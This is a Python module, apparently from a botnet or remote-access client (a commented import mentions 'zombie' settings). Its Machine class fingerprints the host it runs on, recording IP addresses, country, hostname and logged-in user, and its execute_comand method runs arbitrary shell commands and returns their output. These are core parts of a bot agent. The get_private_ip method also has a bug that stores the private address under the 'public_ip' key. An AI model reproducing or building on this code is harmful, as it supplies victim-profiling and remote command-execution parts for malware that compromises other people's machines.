#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import socket, platform, os
from subprocess import STDOUT, check_output, CalledProcessError

from app.components import logger
from app.modules import http_client
#from app.modules.backup_settings import get_zombie_settings, set_zombie_settings



class Machine:
    def __init__(self):
        self.info = {
            'public_ip': '',
            'country': '',
            'private_ip': '',
            'hostname': '',
            'mac_addr': ''
        }

    def get_private_ip(self):
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            temp_socket.connect(('10.255.255.255', 0))
            self.info['public_ip'] = temp_socket.getsockname()[0]
            return self.info['public_ip']
        except:
            self.info['public_ip'] = '127.0.0.1'
            return False
        finally:
            temp_socket.close()


    def get_public_ip_cc(self):
        try:
            data = http_client.post_json('https://api.myip.com/')
            if data:
                self.info['public_ip'] = data['ip']
                self.info['country'] = data['cc']

                return (self.info['public_ip'], self.info['country'])
            return False
        except:
            return False


    def get_hostname(self):
        # return os.uname()[1]
        # test which works on windows
        #return socket.gethostname()
        try:
            self.info['hostname'] = platform.node()
            if self.info['hostname']:
                return self.info['hostname']
        except:
            return False


    def get_current_user(self):
        try:
            if platform.system() == 'Windows':
                self.info['current_user'] = os.getlogin()
            elif platform.system() == 'Linux':
                import pwd
                self.info['current_user'] = pwd.getpwuid(os.getuid()).pw_name
            if self.info['current_user']:
                return self.info['current_user']
        except:
            return False


    def refresh_public_net_info(self):
        self.get_public_ip_cc()


    # read saved conf from config file
    def refresh_local_net_info(self):
        self.get_hostname()
        self.get_private_ip()
        self.get_current_user()

    def execute_comand(self, command, timeout):
        try:
            output = check_output(command, stderr=STDOUT, timeout=timeout, shell=True)
            return output
        except CalledProcessError:
            return False
